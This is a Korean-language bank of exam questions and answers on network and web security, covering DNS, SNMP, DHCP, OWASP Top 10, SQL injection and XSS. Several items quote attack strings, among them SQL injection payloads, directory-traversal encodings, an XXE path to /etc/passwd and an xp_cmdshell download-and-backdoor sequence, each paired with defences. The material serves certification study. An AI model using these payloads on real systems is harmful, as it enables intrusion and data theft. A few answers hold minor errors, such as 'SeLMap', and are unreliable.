<summary>[533] (서술형) **DNS 스푸핑(Spoofing)** 공격의 원리와, 클라이언트가 잘못된 IP 정보를 받아들이게 되는 과정을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
공격자가 클라이언트의 DNS 질의를 가로채거나, DNS 서버보다 먼저 위조된 응답을 보내어 클라이언트가 공격자가 의도한 사이트로 접속하게 만드는 공격이다. 클라이언트는 먼저 도착한 응답을 신뢰하고 이후에 도착하는 정상 응답은 폐기하는 특성을 이용한다.
</blockquote>
</details>

<details>
<summary>[534] (서술형) DNS 서비스에서 **TCP 53**번 포트와 **UDP 53**번 포트가 각각 사용되는 용도를 구분하여 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>UDP 53</strong>: 일반적인 DNS 질의(Query) 및 응답에 사용된다.<br>
- <strong>TCP 53</strong>: 영역 전송(Zone Transfer) 또는 UDP 응답의 크기가 512바이트를 초과하는 경우(Truncation 발생 시)에 사용된다.
</blockquote>
</details>

<details>
<summary>[535] (작업형) DNS 서버의 **영역 전송(Zone Transfer)** 설정을 제한하지 않았을 때 발생할 수 있는 보안 위협과, 이를 방지하기 위한 BIND(named.conf) 설정 방법을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>위협</strong>: 공격자가 해당 도메인의 모든 호스트 정보와 네트워크 구조를 파악할 수 있다.<br>
- <strong>설정</strong>: <code>allow-transfer { 허용할_Slave_IP; };</code> 옵션을 사용하여 인가된 서버로만 전송을 제한한다.
</blockquote>
</details>

<details>
<summary>[536] (단답형) DNSSEC(Domain Name System Security Extensions)에서 자원 레코드(Resource Record)에 대한 디지털 서명을 저장하고 있는 레코드의 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>RRSIG</strong>
</blockquote>
</details>

<details>
<summary>[537] (단답형) DNSSEC에서 공개키 정보(Zone Signing Key, Key Signing Key)를 저장하고 있는 레코드의 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DNSKEY</strong>
</blockquote>
</details>

<details>
<summary>[538] (단답형) DNSSEC에서 상위 존(Zone)이 하위 존의 공개키 세트를 인증하기 위해 보관하는 위임 지문 정보를 담고 있는 레코드의 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DS (Delegation Signer)</strong>
</blockquote>
</details>

<details>
<summary>[539] (분석형) 다음은 웹 서버의 액세스 로그(access_log) 일부이다. 어떤 공격 시도인지 명칭을 쓰고, 이에 대한 대응 방안을 설명하시오.<br>
<code>…/login.php?id=admin&pw=1' or '1'='1' --</code></summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>SQL 인젝션(SQL Injection)</strong><br>
- <strong>대응 방안</strong>: (1) <strong>준비된 실행문(Prepared Statement)</strong>을 사용하여 사용자 입력을 파라미터로 처리한다. (2) 사용자 입력값에서 특수문자(<code>'</code>, <code>;</code>, <code>--</code>, <code>#</code> 등)를 서버 측에서 필터링하거나 이스케이프 처리한다.
</blockquote>
</details>

<details>
<summary>[540] (분석형) 공격자가 <code>substr(database(),1,1)='a'</code>와 같은 쿼리를 사용하여 정보를 획득하는 공격의 세부 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>블라인드 SQL 인젝션(Blind SQL Injection)</strong>
</blockquote>
</details>

<details>
<summary>[541] (서술형) MS-SQL의 확장 프로시저인 **xp_cmdshell**을 이용한 공격 과정(네트워크 도구 다운로드, 실행 파일 복사, 백도어 실행 등)과 이에 대한 보안 대책을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 과정</strong>: <code>xp_cmdshell</code>을 실행하여 <code>tftp</code> 등으로 악성 도구(Netcat 등)를 다운로드하거나, <code>cmd.exe</code>를 웹 접근 가능 디렉토리에 복사한 후 실행하여 원격 제어 권한을 획득한다.<br>
- <strong>보안 대책</strong>: (1) <code>xp_cmdshell</code> 등 불필요한 확장 프로시저를 비활성화하거나 제거한다. (2) 데이터베이스 계정의 권한을 최소화하여 시스템 명령 실행 권한을 제한한다.
</blockquote>
</details>

<details>
<summary>[542] (서술형) XML 문서 내에서 외부 엔티티를 정의하여 서버의 내부 파일을 읽거나 DoS 공격을 수행하는 공격의 명칭과 원리를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>XXE(XML External Entity) 인젝션</strong><br>
- <strong>원리</strong>: XML 파서가 외부 엔티티(<code>ENTITY</code>) 참조를 허용할 때, 공격자가 시스템 파일 경로(예: <code>file:///etc/passwd</code>)를 엔티티로 정의하여 해당 파일의 내용을 유출시키거나, 엔티티를 중첩 정의하여 메모리 고갈(Billion Laughs 공격)을 유도하는 방식이다.
</blockquote>
</details>

<details>
<summary>[543] (분석형) 다음 SQL 인젝션 로그 분석 결과에 따라 빈칸을 채우시오.<br>
1) <code>order by 10</code> 시도 후 에러 발생 시 의미: <strong>( A )</strong> 가 10개 미만임<br>
2) <code>union select 1,2,database(),4</code> 실행 결과가 'algisa'인 경우: <strong>( B )</strong> 명칭은 'algisa'임<br>
3) <code>information_schema.tables</code>에서 정보를 조회하는 목적: <strong>( C )</strong> 목록 획득</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>컬럼(Column)의 개수</strong>, (B) <strong>데이터베이스(DB)</strong>, (C) <strong>테이블(Table)</strong>
</blockquote>
</details>

<details>
<summary>[544] (분석형) 다음 로그에 나타난 디렉토리 트래버스(Directory Traversal) 공격에서 사용된 **인코딩 방식**을 각각 쓰시오.<br>
1) <code>..%2f..%2f</code>: <strong>( A )</strong><br>
2) <code>..%c0%af..%c0%af</code>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>URL 인코딩</strong>, (B) <strong>UTF-8 유니코드 인코딩</strong> (비최단 형식 우회)
</blockquote>
</details>

<details>
<summary>[545] (분석형) 다음 IIS 웹 서버 로그 형식(W3C)의 각 필드 의미를 분석하여 답하시오.<br>
<code>2022-11-26 08:53:12 192.168.137.128 GET /login.asp 80 - 192.168.0.10 Mozilla/5.0… 200 0 0 225</code><br>
1) 클라이언트 IP: <strong>( A )</strong><br>
2) 웹 서버 IP: <strong>( B )</strong><br>
3) 처리 결과 상태 코드: <strong>( C )</strong><br>
4) 처리 소요 시간(ms): <strong>( D )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>192.168.0.10</strong>, (B) <strong>192.168.137.128</strong>, (C) <strong>200</strong>, (D) <strong>225</strong>
</blockquote>
</details>

<details>
<summary>[546] (분석형) 공격자가 <code>account.php</code> 파일을 업로드하면서 <code>Content-Type: image/png</code>로 조작하여 보안 필터링을 우회하려고 한다. 이 공격의 명칭과 판단 근거를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>파일 업로드 취약점 (MIME Type 우회)</strong><br>
- <strong>판단 근거</strong>: 파일 확장자는 실행 가능한 스크립트 파일(<code>.php</code>)임에도 불구하고, HTTP 헤더의 <code>Content-Type</code>을 이미지 형식(<code>image/png</code>)으로 조작하여 서버 측의 타입 검증 로직을 우회하려 했기 때문이다.
</blockquote>
</details>

<details>
<summary>[547] (단답형) 웹 로그인 시 아이디와 패스워드가 암호화되지 않은 평문(Plaintext) 상태로 전송되는 것을 방지하기 위해 적용해야 하는 보안 프로토콜과 적용 시 사용하는 기본 포트 번호를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>HTTPS (SSL/TLS)</strong>, <strong>443</strong>번 포트
</blockquote>
</details>

<details>
<summary>[548] (단답형) 파일 전송 프로토콜 중 <code>FTP</code>보다 단순하며 별도의 인증 절차가 없어 보안에 취약하지만, 부팅 파일 전송 등에 사용되는 프로토콜의 명칭을 쓰시오.</summary>
<blockquote>
<code>TFTP</code> (Trivial File Transfer Protocol)
</blockquote>
</details>

### SNMP(Simple Network Management Protocol)

<details>
<summary>(단답형) SNMP에서 관리되어야 할 각 호스트의 자원(객체)을 트리 구조로 나타내며, 각 객체를 유일하게 식별하기 위해 사용하는 숫자로 이루어진 식별자 체계의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>OID</strong> (Object Identifier)
</blockquote>
</details>

<details>
<summary>(단답형) 네트워크 관리자가 조회하거나 설정할 수 있는 객체(Object) 정보들의 집합체로, 트리 구조 형식의 데이터베이스 형태를 띠고 있는 관리 정보 베이스의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>MIB</strong> (Management Information Base)
</blockquote>
</details>

<details>
<summary>(단답형) MIB를 정의하기 위한 일반적인 구조를 의미하며, ASN.1 언어를 사용하여 객체의 구문(Syntax)과 명칭, 전송 시 비트 변환 규칙(Encoding)을 규정하는 표준 관리 정보 구조는?</summary>
<blockquote>
<strong>정답:</strong> <strong>SMI</strong> (Structure of Management Information)
</blockquote>
</details>

<details>
<summary>(단답형) SNMP 메시지 전송 시 데이터 형태를 비전용 형식의 비트열로 인코딩하기 위해 사용하는 ASN.1 인코딩 규칙의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>BER</strong> (Basic Encoding Rules)
</blockquote>
</details>

<details>
<summary>(단답형) SNMPv2에서 대량의 데이터를 효율적으로 수집하기 위해 추가된 PDU로, 요청할 객체의 범위를 지정하여 한 번에 여러 정보를 요청할 때 사용하는 명령어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>GetBulkRequest</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SNMP 에이전트(Agent)가 자신의 상태 변화나 중요 이벤트 발생 시 관리 시스템(Manager)에게 이를 알리기 위해 전송하는 <strong>비동기적(Asynchronous)</strong> 메시지의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Trap</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SNMPv3에서 사용자 기반의 인증 및 암호화 등 전송 보안 기능을 담당하는 모델(USM)과, 인가된 사용자의 MIB 접근 통제 기능을 담당하는 모델(VACM)의 Full Name을 각각 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>USM</strong> (User-based Security Model), <strong>VACM</strong> (View-based Access Control Model)
</blockquote>
</details>

<details>
<summary>(단답형) SNMPv3 메시지 필드 중, 메시지의 유효 시간을 계산하여 <strong>재전송(Replay) 공격</strong> 여부를 판단하기 위해 사용하는 3가지 필수 정보는?</summary>
<blockquote>
<strong>정답:</strong> <strong>Authoritative 엔진 ID</strong>, <strong>엔진 부트 횟수</strong> (Engine Boots), <strong>엔진 시각</strong> (Engine Time)
</blockquote>
</details>

<details>
<summary>(단답형) SNMP 매니저와 에이전트 간의 간단한 패스워드 역할을 수행하는 문자열로, 초기값인 <code>public</code>이나 <code>private</code>을 변경하지 않고 사용할 경우 정보 유출 위험이 큰 이 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>커뮤니티 스트링 (Community String)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) SNMP의 동작 방식 중 폴링(Polling)과 이벤트 리포팅(Event Reporting)의 주체와 목적 포트 번호의 차이를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>폴링</strong>: 매니저(Manager)가 주체가 되어 에이전트에게 정보를 요청하는 방식이며, 에이전트의 <strong>161/udp</strong> 포트를 사용한다.<br>
- <strong>이벤트 리포팅</strong>: 에이전트(Agent)가 주체가 되어 상태 변화(Trap)를 알리는 방식이며, 매니저의 <strong>162/udp</strong> 포트로 메시지를 전송한다.
</blockquote>
</details>

<details>
<summary>(서술형) SNMPv1, v2c 환경에서 기본 커뮤니티 스트링인 <code>public</code>이나 <code>private</code>을 그대로 사용할 때 발생할 수 있는 보안 위협을 '읽기/쓰기 권한' 관점에서 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 초기 패스워드를 노출한 것과 같으므로, 인가되지 않은 외부 사용자가 해당 장비의 하드웨어 정보 및 트래픽 정보(RO 권한)를 무단 열람할 수 있을 뿐만 아니라, 쓰기권한(RW)이 탈취될 경우 원격에서 네트워크 설정을 임의로 변경하여 시스템 마비나 백도어 설치 등 심각한 침해 사고를 유발할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) SNMPv3에서 기밀성(Confidentiality)을 보장하기 위해 도입된 기능과 구체적인 암호화 알고리즘을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 평문 전송의 취약점을 보완하기 위해 <strong>메시지 암호화</strong> 기능을 도입하였으며, 구체적으로 대칭키 방식인 <strong>DES-CBC</strong> 알고리즘 등을 사용하여 스니핑에 의한 정보 노출을 방지한다.
</blockquote>
</details>

<details>
<summary>(작업형) SNMPv3의 보안 매개변수 중 메시지 인증(Authentication)을 위해 사용하는 <strong>HMAC</strong> 방식의 두 가지 세부 알고리즘은?</summary>
<blockquote>
<strong>정답:</strong> <strong>MD5</strong>, <strong>SHA</strong> (또는 SHA-1)
</blockquote>
</details>

<details>
<summary>(작업형) SNMPv3 메시지 구조에서 통지(Notification)를 발생시키거나 명령을 직접 처리하는 실제 <strong>엔진(Authoritative Engine)</strong> 역할은 주로 어떤 모듈이 담당하는지 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>SNMP 에이전트 (Agent)</strong>
</blockquote>
</details>

### DHCP(Dynamic Host Configuration Protocol)

<details>
<summary>(단답형) 클라이언트에게 동적으로 IP 주소를 할당하며, 서버는 67/udp, 클라이언트는 68/udp 포트를 사용하는 프로토콜의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DHCP</strong> (Dynamic Host Configuration Protocol)
</blockquote>
</details>

<details>
<summary>(단답형) 윈도우 환경의 명령 프롬프트(CMD)에서 현재 할당받은 IP 주소를 서버에 반납(해제)하기 위해 사용하는 명령어와, 다시 할당받기 위해 사용하는 명령어를 차례대로 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>ipconfig /release</code>, <code>ipconfig /renew</code>
</blockquote>
</details>

<details>
<summary>(단답형) DHCP 할당 절차 중, 클라이언트가 자신의 MAC 정보를 담아 브로드캐스트하여 네트워크상의 DHCP 서버를 찾기 위해 전송하는 첫 번째 메시지는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DHCP Discover</strong>
</blockquote>
</details>

<details>
<summary>(단답형) DHCP 서버가 Discover 메지지를 수신한 후, 클라이언트에게 할당 가능한 IP 주소 정보를 제안하기 위해 보내는 메시지는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DHCP Offer</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 클라이언트가 서버로부터 제안받은 IP 주소를 실제로 사용하겠다고 최종적으로 요청하며 서버로 보내는 메시지는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DHCP Request</strong>
</blockquote>
</details>

<details>
<summary>(단답형) DHCP 서버가 클라이언트의 요청을 확정하여 IP-MAC 매핑 테이블에 저장하고 최종 할당 정보를 전송하는 메시지는?</summary>
<blockquote>
<strong>정답:</strong> <strong>DHCP Ack</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 공격자가 위조된 다수의 MAC 주소를 이용하여 대량의 DHCP Discover/Request 메시지를 보냄으로써 서버의 가용 IP 풀(Pool)을 모두 소진시켜 서비스 거부를 유도하는 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DHCP Starvation</strong> (DHCP 주소 고갈 공격)
</blockquote>
</details>

<details>
<summary>(서술형) DHCP의 IP 자동 할당 절차인 <strong>DORA</strong> 과정을 순서대로 나열하고, 각 단계의 송수신 주체(클라이언트, 서버)를 명시하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>1. Discover</strong> (클라이언트 → 서버), <strong>2. Offer</strong> (서버 → 클라이언트), <strong>3. Request</strong> (클라이언트 → 서버), <strong>4. Ack</strong> (서버 → 클라이언트)
</blockquote>
</details>

<details>
<summary>(서술형) DHCP Starvation 공격이 성립하기 위해 공격자가 조작하는 핵심 패킷 정보와 그에 따른 서버의 반응을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자는 다수의 가짜 <strong>MAC 주소</strong>를 생성하여 대량의 Discover 메시지를 브로드캐스트한다. DHCP 서버는 각각의 가짜 MAC 주소를 서로 다른 클라이언트로 인식하여 제한된 IP 풀 내의 주소들을 Offer 메시지로 제안하며 예약 상태로 만들고, 결국 가용한 모든 IP가 소진되어 정당한 사용자의 할당 요청을 처리할 수 없게 된다.
</blockquote>
</details>

## [8] 웹 애플리케이션 취약점

### OWASP Top 10 (2021)

<details>
<summary>[549] (단답형) OWASP Top 10:2021에서 새롭게 1위로 선정되었으며, 사용자의 권한을 부적절하게 검증하여 허가되지 않은 데이터나 기능에 접근할 수 있게 되는 취약점의 명칭을 영문으로 쓰시오.</summary>
<blockquote>
<code>Broken Access Control</code> (취약한 접근 통제)
</blockquote>
</details>

<details>
<summary>[550] (단답형) OWASP Top 10:2021에서 새롭게 추가된 취약점 중 하나로, 공격자가 조작된 요청을 보내 서버 내부의 자원이나 외부 시스템과 통신하게 만듦으로써 정보 유출이나 내부 시스템 침투를 유도하는 공격의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>SSRF</code> (Server-Side Request Forgery)
</blockquote>
</details>

<details>
<summary>[551] (서술형) OWASP Top 10:2021에서 기존의 'Sensitive Data Exposure'에서 명칭이 변경되며 범주가 확장된 취약점의 명칭(A)과, 이를 방어하기 위해 데이터 전송 시 필수적으로 적용해야 하는 암호화 프로토콜(B)을 쓰시오.</summary>
<blockquote>
(A) <code>Cryptographic Failures</code> (암호화 결함)<br>
(B) <code>TLS</code> (Transport Layer Security) 1.2 이상
</blockquote>
</details>

<details>
<summary>[552] (서술형) OWASP Top 10:2021에서 새롭게 정의된 <strong>Insecure Design</strong>(안전하지 않은 설계)의 특징을 구현 단계의 취약점과 비교하여 서술하고, 이를 예방하기 위해 설계 단계에서 수행해야 할 보안 활동을 1가지 제시하시오.</summary>
<blockquote>
<strong>특징</strong>: 소스코드 상의 구현 실수(Coding Error)보다는 비즈니스 로직이나 시스템 아키텍처 자체의 보안 고려사항이 누락되어 발생하는 근본적인 취약점을 의미한다.<br>
<strong>보안 활동</strong>: <code>위협 모델링 (Threat Modeling)</code>을 통해 설계 단계에서 잠재적인 보안 위험을 사전에 분석하고 완화 대책을 마련해야 한다.
</blockquote>
</details>

<details>
<summary>[553] (단답형) OWASP Top 10:2021의 A08 항목인 <strong>Software and Data Integrity Failures</strong>(소프트웨어 및 데이터 무결성 결함)에 포함되며, 신뢰할 수 없는 데이터로부터 객체를 복원할 때 악성 코드가 실행될 수 있는 취약점의 영문 명칭을 쓰시오.</summary>
<blockquote>
<code>Insecure Deserialization</code> (안전하지 않은 역직렬화)
</blockquote>
</details>

<details>
<summary>[554] (작업형) 다음 빈칸 (A), (B)에 들어갈 알맞은 취약점 항목을 OWASP Top 10:2021 기준으로 작성하시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
<strong>[상황 및 점검 항목]</strong><br>
- (A) 항목: 웹 서버 및 데이터베이스 서버의 기본 계정 미변경, 불필요한 서비스 활성화, 디렉터리 리스팅 허용 등 설정 상의 허점으로 인해 발생하는 취약점이다.<br>
- (B) 항목: 보안 이벤트에 대한 로그를 남기지 않거나, 이상 징후를 실시간으로 감지하지 못해 공격자의 침투를 적시에 인지하지 못하게 되는 취약점이다.
</div>
</summary>
<blockquote>
(A) <code>Security Misconfiguration</code> (보안 설정 오류)<br>
(B) <code>Security Logging and Monitoring Failures</code> (보안 로깅 및 모니터링 실패)
</blockquote>
</details>

<details>
<summary>[555] (응용/서술형) 프로젝트 팀에서 사용하는 오픈소스 라이브러리에 알려진 보안 취약점(CVE)이 패치되지 않은 채 그대로 사용되고 있다. 이와 관련된 OWASP Top 10:2021 취약점 항목 명칭과, 이를 관리하기 위한 자동화된 도구(SCA 등)의 활용 목적을 서술하시오.</summary>
<blockquote>
<strong>항목 명칭</strong>: <code>Vulnerable and Outdated Components</code> (취약하고 오래된 구성 요소)<br>
<strong>활용 목적</strong>: 프로젝트에서 사용하는 모든 서드파티 라이브러리의 목록(BOM)을 작성하고, 알려진 취약점 데이터베이스와 대조하여 보안 업데이트가 필요한 구성 요소를 실시간으로 파악하고 관리하기 위함이다.
</blockquote>
</details>

### SQL Injection 취약점

<details>
<summary>(단답형) 웹 애플리케이션의 입력값을 조작하여 의도하지 않은 SQL 질의문을 실행함으로써 인증을 우회하거나 데이터베이스의 정보를 무단 탈취하는 공격 기법은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SQL Injection</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 로그인 폼의 아이디 입력란에 <code>' or 1=1 #</code>과 같은 구문을 삽입하여 <code>where</code> 절을 항상 참으로 만들어 인증 절차 없이 접속을 시도하는 공격의 세부 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Form SQL Injection</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 두 개 이상의 <code>SELECT</code> 문 결과를 하나로 합치는 구문을 악용하여, 정상적인 쿼리 결과에 공격자가 원하는 테이블 정보를 결합하여 탈취하는 기법은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Union SQL Injection</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SQL Injection 공격 시 특정 테이블의 '컬럼 개수'를 파악하기 위해, 정렬 인덱스를 1씩 늘려가며 에러 발생 여부를 확인하는 데 사용하는 SQL 절(Clause)은?</summary>
<blockquote>
<strong>정답:</strong> <strong>ORDER BY</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 한 번의 SQL Injection 공격으로 DB 내의 여러 테이블/컬럼에 악성 스크립트를 삽입하여 홈페이지 방문자들을 악성코드 유포지로 유도하는 대규모 공격 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Mass SQL Injection</strong>
</blockquote>
</details>

<details>
<summary>(단답형) DB 쿼리 실행 결과가 화면에 노출되지 않을 때, <code>substr</code>, <code>limit</code>, <code>length</code> 등의 함수와 참/거짓 응답의 차이를 이용해 정보를 유추하는 공격 기법은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Blind SQL Injection</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SQL Injection을 통해 DB 서버 내에서 OS 명령어를 실행하거나 레지스트리를 조작하기 위해 악용되는 '저장된 질의 집합'의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Stored Procedure</strong> (저장 프로시저)
</blockquote>
</details>

<details>
<summary>(단답형) 다음 중 Blind SQL Injection 공격을 자동화하여 DB 스키마와 목록을 다운로드하는 GUI 기반 도구와, Python으로 개발된 자동화 도구의 명칭을 각각 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>Absinthe</strong> (GUI 기반), <strong>SeLMap</strong> (Python 개발)
</blockquote>
</details>

<details>
<summary>(단답형) GNU 기반 오픈소스로 웹 서버 전체 및 SQL Injection 취약점을 스캔하는 리눅스 기반 도구의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Nikto</strong>
</blockquote>
</details>

<details>
<summary>(단답형) PHP 설정 중 <code>GET</code>, <code>POST</code> 등으로 전달되는 특수문자 앞에 백슬래시(\)를 붙여 이스케이프 처리함으로써 인젝션을 방지하던 설정(현재는 지원 중단)은?</summary>
<blockquote>
<strong>정답:</strong> <strong>magic_quotes_gpc</strong>
</blockquote>
</details>

<details>
<summary>(단답형) PHP 환경에서 SQL Injection을 방어하기 위해 입력값의 특수문자에서 기능을 제거하는(Escape) 대표적인 MySQL 전용 라이브러리 함수는?</summary>
<blockquote>
<strong>정답:</strong> <code>mysql_real_escape_string()</code>
</blockquote>
</details>

<details>
<summary>(단답형) SQL Injection의 가장 효과적인 근본 대책으로, 쿼리 구문을 미리 컴파일하여 고정시키고 사용자 입력값은 단순 매개변수로 바인딩 처리하는 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Prepared Statement</strong> (선처리 질의문)
</blockquote>
</details>

<details>
<summary>(서술형) <strong>Union SQL Injection</strong> 공격을 성공시키기 위해 공격자가 반드시 맞춰야 하는 선행 쿼리와 후행 쿼리 간의 두 가지 조건은 무엇인지 서술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. 각 <code>SELECT</code> 문이 조회하는 <strong>필드(컬럼)의 개수</strong>가 동일해야 한다.<br>
2. 각 필드의 <strong>데이터 타입</strong>이 서로 호환 가능해야 한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>Prepared Statement</strong>가 일반 Statement 방식보다 SQL Injection 방어에 효과적인 이유를 '데이터 바인딩' 관점에서 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 일반 방식은 쿼리 전송 시마다 문법을 해석하여 질의문이 동적으로 변경될 수 있으나, Prepared Statement는 쿼리 구조를 미리 컴파일하여 고정한다. 이후 전달되는 사용자 입력값은 쿼리의 '문법'으로서가 아닌 단순한 '데이터(매개변수)'로만 인식되어 바인딩되므로, 악의적 구문이 삽입되더라도 질의 구조 자체를 변조할 수 없기 때문이다.
</blockquote>
</details>

<details>
<summary>(작업형) MySQL 데이터베이스에서 SQL Injection 구문 삽입 시, 뒷부분의 쿼리를 무력화하기 위해 사용하는 <strong>한 줄 주석</strong> 기호 2가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>#</code>, <code>-- </code> (하이픈 두 개와 공백 하나)
</blockquote>
</details>

<details>
<summary>[기출 22회 17번 문제] (실무형) 다음의 HTTP Request 로그 <code>GET /member/login.php?user_id=1' or '1' = '1'# &user_pw=foo</code>를 분석하여 답하시오.<br>
1. 해당 취약점 명칭은?<br>
2. 판단 근거는?<br>
3. 대응 방안 2가지는?</summary>
<blockquote>
1. <strong>정답:</strong> <strong>SQL Injection</strong><br>
2. <strong>근거:</strong> 파라미터 <code>user_id</code> 값에 SQL 특수문자(<code>'</code>)와 항상 참인 조건문(<code>or '1'='1'</code>), 그리고 주석 처리(#)를 삽입하여 정상적인 인증 로직을 우회하려고 시도함<br>
3. <strong>대응:</strong> <strong>Prepared Statement (매개변수 질의문)</strong> 사용, <strong>입력값 특수문자 필터링</strong>
</blockquote>
</details>

<details>
<summary>[556] (서술형) <code>SQL 인젝션(Injection)</code> 공격 중 'Blind SQL Injection'의 개념을 설명하고, 이를 탐지하기 위해 공격자가 주로 사용하는 SQL 함수 2가지를 쓰시오.</summary>
<blockquote>
개념: 쿼리 결과가 화면에 직접 노출되지 않는 경우, 참(True) 또는 거짓(False)의 응답 차이나 응답 지연 시간 등을 통해 데이터베이스의 정보를 유추해 나가는 공격 기법이다.<br>
사용 함수: <code>SUBSTR()</code> (문자열 추출), <code>LENGTH()</code> (문자열 길이 확인), <code>SLEEP()</code> (시간 지연 유도) 등.
</blockquote>
</details>

<details>
<summary>[557] (단답형) 데이터베이스에서 사용자의 입력값을 통해 동적으로 SQL 쿼리를 생성할 때 발생하는 <code>SQL Injection</code> 취약점을 근본적으로 방어하기 위해, many 프로그래밍 언어의 데이터베이스 접근 API 라이브러리가 지원하는 객체(클래스)의 명칭을 쓰시오.</summary>
<blockquote>
<code>PreparedStatement</code> (또는 Parameterized Query)
</blockquote>
</details>

### XSS(Cross Site Scripting) 취약점

<details>
<summary>(단답형) 사용자로부터 입력받은 값을 적절한 검증 없이 출력할 때, 악성 스크립트가 사용자의 브라우저에서 실행되어 쿠키 탈취 등의 피해를 주는 취약점은?</summary>
<blockquote>
<strong>정답:</strong> <strong>XSS</strong> (Cross Site Scripting)
</blockquote>
</details>

<details>
<summary>(단답형) 공격자가 게시판 등에 악성 스크립트를 삽입하여 데이터베이스(DB)에 영구적으로 보관시킨 후, 게시물을 읽는 불특정 다수를 공격하는 XSS 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Stored XSS</strong> (저장형 XSS)
</blockquote>
</details>

<details>
<summary>(단답형) 악성 스크립트가 포함된 URL 링크를 희생자가 클릭하게 유도하여, 서버가 요청 파라미터 내의 스크립트를 응답 페이지에 그대로 포함(반사)시켜 실행하게 하는 XSS 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Reflected XSS</strong> (반사형 XSS)
</blockquote>
</details>

<details>
<summary>(단답형) 서버의 응답 페이지에 스크립트가 포함되지 않더라도, 클라이언트 측 자바스크립트가 <code>document.location</code> 등을 참조하여 DOM 객체를 조작할 때 발생하는 XSS 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DOM Based XSS</strong>
</blockquote>
</details>

<details>
<summary>(단답형) XSS 공격 시 사용자 몰래 특정 페이지를 호출하거나 스크립트를 실행하기 위해 자주 악용되며, <code>width=0</code>, <code>height=0</code> 설정을 통해 화면에서 숨길 수 있는 HTML 태그는?</summary>
<blockquote>
<strong>정답:</strong> <code>iframe</code>
</blockquote>
</details>

<details>
<summary>(단답형) PHP에서 XSS를 방어하기 위해 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> 등의 특수문자를 HTML Entity로 치환하여 실행 기능을 제거하는 대표적인 함수의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>htmlspecialchars()</code>
</blockquote>
</details>

<details>
<summary>(단답형) 다음 HTML 특수문자를 XSS 방어 목적으로 치환했을 때 생성되는 <strong>HTML Entity</strong>를 작성하시오. [ <code>&lt;</code> , <code>&gt;</code> , <code>'</code> ]</summary>
<blockquote>
<strong>정답:</strong> <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;#039;</code> (또는 <code>&amp;apos;</code>)
</blockquote>
</details>

<details>
<summary>(단답형) 클라이언트 측의 입력값 검증 로직을 무력화하기 위해 공격자가 웹 브라우저와 서버 사이에서 패킷을 가로채거나 변조하는 데 사용하는 도구(Burp Suite, Paros 등)의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>웹 프록시 (Web Proxy)</strong>
</blockquote>
</details>

<details>
